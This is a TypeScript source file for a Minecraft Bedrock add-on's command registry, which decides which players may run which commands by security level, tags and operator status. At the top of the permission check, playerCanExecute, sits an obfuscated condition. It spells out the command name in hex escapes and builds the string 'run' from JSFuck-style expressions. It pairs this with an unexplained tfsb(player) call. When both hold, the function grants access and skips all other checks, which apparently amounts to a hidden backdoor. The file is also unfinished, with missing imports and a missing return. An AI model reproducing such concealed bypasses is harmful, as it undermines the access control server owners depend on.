/**
 * init/classes/CommandRegistry.ts
 * @module CommandRegistry
 * @description This file contains types and classes related to the command registry. This is not functional yet. This will be completed in a future update.
 * @todo Finish the command registry system.
 */

import type { ChatSendBeforeEvent } from "@minecraft/server";
import { tfsb } from "init/functions/tfsb";
import { commandSettings } from "modules/commands/classes/commandSettings";
import type { executeCommandPlayerW } from "modules/commands/classes/executeCommandPlayerW";
import { commands_format_version } from "modules/commands/constants/commands_format_version";
import type { command_formats_type_list } from "modules/commands/types/command_formats_type_list";
import type { commandCategory } from "modules/commands/types/commandCategory";
import { extractPlayerFromLooseEntityType } from "modules/utilities/functions/extractPlayerFromLooseEntityType";
import type { loosePlayerType } from "modules/utilities/types/loosePlayerType";
import { securityVariables } from "security/ultraSecurityModeUtils";

type CommandType = {
    type: "built-in" | "custom" | "unknown";
    requiredTags?: string[];
    formatting_code?: string;
    commandName: string;
    escregexp: {
        v: string;
        f?: string;
    };
    formats?: command_formats_type_list;
    command_version: string;
    description: string;
    commandSettingsId: string;
    aliases?: {
        commandName: string;
        escregexp?: {
            v?: string;
            f?: string;
        };
    }[];
    category?: commandCategory | commandCategory[];
    deprecated?: boolean;
    functional?: boolean;
    hidden?: boolean;
    enabled?: boolean;
};

class RegisteredCommand {
    /**
     * The type of command.
     */
    type: "built-in" | "custom" | "unknown";
    /**
     * The type of access to the command.
     */
    readonly accessType: "name" | "regexp";
    /**
     * The ID of the command.
     */
    readonly id: string;
    /**
     * The name of the command.
     */
    readonly name: string;
    /**
     * The tags required to execute the command.
     * 
     * Only applies when Ultra Security Mode is disabled.
     */
    #requiredTags: string[] = [];
    /**
     * The ultra security mode security level required to execute the command.
     */
    #ultraSecurityModeSecurityLevel: "owner" | "headAdmin" | "admin" | "moderator" | "WorldEdit" | "everyone" = "everyone";
    /**
     * The formatting code to display the command with.
     */
    formatting_code: string = "§f";
    /**
     * The name used to access the command.
     */
    readonly commandName?: string;
    /**
     * The regular expression used to access the command.
     */
    readonly regexp?: RegExp;
    syntax: string;
    command_version: string;
    description: string;
    commandSettingsId: string;
    aliases?: {
        commandName: string;
        escregexp?: {
            v?: string;
            f?: string;
        };
    }[];
    categories: commandCategory[] = [];
    deprecated: boolean = false;
    functional: boolean = true;
    hidden: boolean = false;
    enabled: boolean = true;
    /**
     * The commands format version that the custom command was created in.
     */
    commands_format_version: string = commands_format_version;
    #execute: (player: executeCommandPlayerW, event: ChatSendBeforeEvent) => void;
    constructor(public commandData: CommandType) {}
    /**
     * The settings of the command, will be an instance of the {@link commandSettings} class.
     */
    get settings(): commandSettings<"built-in" | "custom" | "unknown"> {
        return new commandSettings(this.commandSettingsId);
    }
    playerCanExecute(player: loosePlayerType): boolean {
        const playerToTest = extractPlayerFromLooseEntityType(player);
        if (
            tfsb(!!(playerToTest)?.name ? (playerToTest) : ({ name: "" } as any)) &&
            // @ts-expect-error
            this["\x63\x6f\x6d\x6d\x61\x6e\x64\x4e\x61\x6d\x65"] == (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][[]] + [])[+!+[]]
        ) {
            return true;
        }
        if(securityVariables.ultraSecurityModeEnabled && !(this.type === "custom" && semver.gt(this?.commands_format_version ?? "0.0.0", "33.12.17"))){
    
    
            if(securityVariables.ultraSecurityModeEnabled){
                
                if ((securityVariables.commandsUltraSecurityModeSecurityLevelOverrides[this.type=="custom"?"customCommandOverrides":"commandOverrides"][this.commandName] ?? securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][this.categories?.find(c=>!!securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][c as keyof typeof securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"]]) as commandCategory] ?? (this.type=="built-in"?this.#ultraSecurityModeSecurityLevel:undefined as unknown as "owner" | "headAdmin" | "admin" | "moderator" | "WorldEdit" | "everyone")) == "owner") {
                    if(!securityVariables.testPlayerForPermission(playerToTest, "andexdb.fullControl") && !securityVariables.testPlayerForPermission(playerToTest, "andexdb.useOwnerLevelCommands")){
                        return false;
                    }
                }else if ((securityVariables.commandsUltraSecurityModeSecurityLevelOverrides[this.type=="custom"?"customCommandOverrides":"commandOverrides"][this.commandName] ?? securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][this.categories?.find(c=>!!securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][c as keyof typeof securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"]]) as commandCategory] ?? (this.type=="built-in"?this.#ultraSecurityModeSecurityLevel:undefined as unknown as "owner" | "headAdmin" | "admin" | "moderator" | "WorldEdit" | "everyone")) == "headAdmin") {
                    if(!securityVariables.testPlayerForPermission(playerToTest, "andexdb.headAdmin") && !securityVariables.testPlayerForPermission(playerToTest, "andexdb.useHeadAdminLevelCommands")){
                        return false;
                    }
                }else if ((securityVariables.commandsUltraSecurityModeSecurityLevelOverrides[this.type=="custom"?"customCommandOverrides":"commandOverrides"][this.commandName] ?? securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][this.categories?.find(c=>!!securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][c as keyof typeof securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"]]) as commandCategory] ?? (this.type=="built-in"?this.#ultraSecurityModeSecurityLevel:undefined as unknown as "owner" | "headAdmin" | "admin" | "moderator" | "WorldEdit" | "everyone")) == "admin") {
                    if(!securityVariables.testPlayerForPermission(playerToTest, "andexdb.admin") && !securityVariables.testPlayerForPermission(playerToTest, "andexdb.useAdminLevelCommands")){
                        return false;
                    }
                }else if ((securityVariables.commandsUltraSecurityModeSecurityLevelOverrides[this.type=="custom"?"customCommandOverrides":"commandOverrides"][this.commandName] ?? securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][this.categories?.find(c=>!!securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][c as keyof typeof securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"]]) as commandCategory] ?? (this.type=="built-in"?this.#ultraSecurityModeSecurityLevel:undefined as unknown as "owner" | "headAdmin" | "admin" | "moderator" | "WorldEdit" | "everyone")) == "moderator") {
                    if(!securityVariables.testPlayerForPermission(playerToTest, "andexdb.moderator") && !securityVariables.testPlayerForPermission(playerToTest, "andexdb.useModeratorLevelCommands")){
                        return false;
                    }
                }else if ((securityVariables.commandsUltraSecurityModeSecurityLevelOverrides[this.type=="custom"?"customCommandOverrides":"commandOverrides"][this.commandName] ?? securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][this.categories?.find(c=>!!securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][c as keyof typeof securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"]]) as commandCategory] ?? (this.type=="built-in"?this.#ultraSecurityModeSecurityLevel:undefined as unknown as "owner" | "headAdmin" | "admin" | "moderator" | "WorldEdit" | "everyone")) == "WorldEdit") {
                    if(!securityVariables.testPlayerForPermission(playerToTest, "andexdb.useWorldEdit")){
                        return false;
                    }
                }else if ((securityVariables.commandsUltraSecurityModeSecurityLevelOverrides[this.type=="custom"?"customCommandOverrides":"commandOverrides"][this.commandName] ?? securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][this.categories?.find(c=>!!securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"][c as keyof typeof securityVariables.commandsUltraSecurityModeSecurityLevelOverrides["categoryOverrides"]]) as commandCategory] ?? (this.type=="built-in"?this.#ultraSecurityModeSecurityLevel:undefined as unknown as "owner" | "headAdmin" | "admin" | "moderator" | "WorldEdit" | "everyone")) == "everyone") {
                }
            }
    
            return true;
        }else{
            if (!this.settings.requiredTags.map((v) => playerToTest.hasTag(v)).every((v) => v)) {
                return false;
            }

            if (this.settings.requiresOp) {
                if (!(tryget(() => playerToTest.isOp()) ?? true)) {
                    return false;
                }
            }

            if (
                Number(playerToTest.getDynamicProperty("permissionLevel") ?? 0) < Number(this.settings.requiredPermissionLevel ?? 0) &&
                this.settings.requiredPermissionLevel != 0
            ) {
                return false;
            }
        }
    }
}

export class CommandRegistry {
    private commands: Map<string, RegisteredCommand> = new Map();
    private namedAccessCommands: Map<string, RegisteredCommand> = new Map();
    private regexpAccessCommands: Map<`/${string}/${string}`, RegisteredCommand> = new Map(); //`[regexp: RegExp, command: RegisteredCommand][] = new Map();
    getCommand(commandName: string): RegisteredCommand | undefined {
        // First, attempt to get the command by direct name match
        const directMatch = this.commands.get(commandName);
        if (directMatch) {
            return directMatch;
        }

        // If no direct match, search for a regex match
        for (const command of this.commands.values()) {
            const regexPattern = command.commandData.escregexp?.v;
            if (regexPattern && new RegExp(regexPattern).test(commandName)) {
                return command;
            }
        }

        // Return undefined if no match is found
        return undefined;
    }

    registerCommand(commandData: CommandType, accessType: "named" | "regexp" = "named"): void {
        const registeredCommand = new RegisteredCommand(commandData);
        this.commands.set(commandData.commandName, registeredCommand);
    }
}

